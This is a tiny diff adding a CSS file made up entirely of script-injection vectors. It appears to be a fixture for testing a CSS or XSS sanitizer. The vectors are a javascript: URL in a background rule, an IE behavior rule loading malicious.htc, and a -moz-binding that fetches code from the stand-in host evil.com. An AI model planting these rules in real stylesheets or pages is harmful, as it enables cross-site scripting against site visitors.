@@ -1,0 +1,4 @@
+
+body { background: url("javascript:alert('xss')"); }
+.evil { behavior: url(malicious.htc); }
+input { -moz-binding: url("http://evil.com/xbl"); }
